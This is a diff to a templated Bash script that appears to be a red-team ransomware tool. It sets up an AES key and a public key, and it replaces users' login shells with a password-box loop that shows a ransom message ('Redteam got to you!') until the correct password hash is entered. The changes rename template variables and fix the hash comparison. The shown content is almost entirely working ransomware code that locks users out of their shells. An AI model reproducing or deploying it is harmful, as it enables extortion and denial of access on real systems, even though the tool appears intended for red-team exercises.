@@ -33,9 +33,9 @@ SetKeys() {
     # Generate AES key
     KEY="`openssl rand -base64 32`"
     # Set the public key either from JINJA or leave blank
-    # {% if PUBLIC_KEY != "" %}
+    # {% if publickey != "" %}
     pubkey="\
-    {{ PUBLIC_KEY }}
+    {{ publickey }}
     "
     # {% else %}
     pubkey=""
@@ -122,20 +122,20 @@ ListFiles() {
 
 SetMessage() {
     # Replace all the shells with the ransom message
-    # {% if RANSOM_MESSAGE %}
-    message='{{ RANSOM_MESSAGE }}'
+    # {% if message %}
+    message='{{ message }}'
     # {% else %}
     message="Oohhh, Scary. Redteam got to you!\n what are you gonna do?\n"
     message="${message}Try guessing, I bet that will work! Just remember,"
     message="${message} we really love you!"
     # {% endif %}
-    # {% if password %}
-    hsh="{{ password }}"
+    # {% if hash != "" %}
+    hsh="{{ hash }}"
     # {% else %}
     hsh="$(echo "redteamlovesyou" | openssl sha1 | cut -d' ' -f2)"
     # {% endif %}
     msg="#!/bin/bash
-while [ \"\$(echo \$pass | openssl sha1 | cut -d' ' -f2)\" != \
+while [ \"\$(echo -n \$pass | openssl sha1 | cut -d' ' -f2)\" != \
 \"$hsh\" ];\
 do pass=\$($DIALOG --title 'Oops...' --cancel-button 'Ok' \
 --passwordbox '$message' 20 50 3>&1 1>&2 2>&3 );\
